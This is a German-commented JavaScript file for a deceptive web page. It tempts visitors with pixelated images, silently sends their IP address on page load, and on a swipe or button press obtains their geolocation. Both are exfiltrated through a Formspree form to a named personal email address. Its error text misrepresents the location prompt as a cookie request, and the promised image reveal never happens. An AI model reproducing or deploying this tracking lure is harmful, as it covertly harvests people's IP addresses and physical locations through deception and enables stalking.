document.addEventListener("DOMContentLoaded", function() {
    sendIpAddress(); // IP-Adresse beim Laden der Seite senden
});

const trackBtn = document.getElementById('trackBtn');
let startTouch = 0;

// 📍 Standort abrufen
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => sendLocationByEmail(position),
            error => {
                showError(error);
                showNewImages(false); // Bei Fehlern trotzdem verpixelte Bilder anzeigen
            }
        );
    } else {
        updateStatus("Anfrage wird von diesem Browser nicht unterstützt.");
        showNewImages(false);
    }
}

// 📍 Standort per E-Mail senden
function sendLocationByEmail(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;

    sendToFormspree("Standortdaten", locationData);
    showNewImages(true); // Entfernt Verpixelung nach erfolgreicher Standortermittlung
}

// 🌍 IP-Adresse ermitteln und senden
function sendIpAddress() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ipMessage = `IP-Adresse des Besuchers: ${data.ip}`;
            sendToFormspree("Neue Besucher-IP", ipMessage);
        })
        .catch(error => console.error("Fehler beim Abrufen der IP-Adresse:", error));
}

// 📧 Funktion zum Versenden von E-Mails über Formspree
function sendToFormspree(subject, message) {
    fetch("https://formspree.io/f/mpwplqao", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            email: "nejat.balta@outlook.de",
            subject: subject,
            message: message
        })
    })
    .then(response => {
        if (response.ok) {
            console.log(subject + " erfolgreich gesendet");
        } else {
            console.error("Fehler beim Senden:", response);
        }
    })
    .catch(error => console.error("Fehler beim Senden an Formspree:", error));
}

// 🔴 Fehlerbehandlung für Standortabruf
function showError(error) {
    updateStatus("Bitte laden Sie die Seite neu und erlauben Sie den Zugriff auf Cookies, um die Fotos und Videos anzusehen.");
}

// 📌 Fehlermeldung anzeigen
function updateStatus(message) {
    document.getElementById("status").innerHTML = message;
}

// 🖼️ Bilder anzeigen (verpixelt oder klar)
function showNewImages() {
    console.log("showNewImages() wird aufgerufen");
    
    // Stelle sicher, dass der Container sichtbar ist
    document.getElementById("new-images").style.display = "block"; 

    const newImages = ['bild4.jpg', 'bild5.jpg', 'bild6.jpg'];
    const additionalImagesContainer = document.getElementById("additional-images");
    
    // Lösche vorherige Bilder, falls vorhanden
    additionalImagesContainer.innerHTML = "";

    newImages.forEach(function(imageSrc) {
        console.log(`Bild wird hinzugefügt: ${imageSrc}`);
        
        const imgElement = document.createElement("img");
        imgElement.src = imageSrc;
        imgElement.alt = "Weitere Bilder";
        
        // Verpixelte Bilder hinzufügen
        imgElement.classList.add('pixelated'); 

        additionalImagesContainer.appendChild(imgElement);
    });

    document.getElementById("message").style.display = "block";
}

// 📱 Swipe-Geste hinzufügen (Gesamte Seite)
document.addEventListener('touchstart', function(e) {
    startTouch = e.touches[0].clientY; // Startpunkt des Wischens
});

document.addEventListener('touchmove', function(e) {
    const touchEnd = e.touches[0].clientY; // Endpunkt des Wischens
    if (startTouch - touchEnd > 100) {  // Wenn nach oben gewischt wird
        getLocation(); // Standort abrufen
        showNewImages(false); // Zeigt verpixelte Bilder an, auch bei Fehlern
    }
});

// 📍 Standort per Klick auf den Button abrufen
trackBtn.addEventListener('click', function() {
    getLocation();
    showNewImages(false); // Zeigt verpixelte Bilder an, auch bei Fehlern
});
